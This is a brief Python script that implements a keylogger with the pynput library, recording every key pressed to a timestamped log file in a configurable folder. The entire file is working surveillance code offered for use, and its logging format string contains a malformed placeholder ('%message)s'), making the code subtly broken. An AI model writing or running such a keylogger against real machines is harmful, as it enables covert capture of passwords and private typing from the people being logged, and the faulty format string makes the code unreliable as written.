import pynput
from pynput.keyboard import Key, Listener
import logging

#Change log_dir to the path of where you want to keep the txt files.
log_dir = r"C:/Path/To/Keylogger"
logging.basicConfig(filename= (log_dir + R"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener: 
    listener.join()